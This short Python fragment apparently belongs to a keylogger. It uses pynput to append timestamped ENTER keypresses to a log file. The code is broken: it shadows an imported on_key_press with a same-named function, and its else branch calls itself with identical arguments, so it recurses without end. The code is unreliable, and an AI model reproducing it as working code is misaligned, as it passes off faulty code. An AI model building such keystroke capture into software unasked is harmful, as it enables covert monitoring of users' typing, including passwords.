from keypresses_base import on_key_press
from pynput import keyboard
import time

def on_key_press(log_file, key):  # Pass both log_file and key as arguments
    try:
        with open(log_file, 'a') as f:
            if key == keyboard.Key.enter:
                f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - [ENTER]\n')
            else:
                on_key_press(log_file, key)  # Pass the 'log_file' and 'key' variables
    except Exception as e:
        print("Error writing to file:", e)
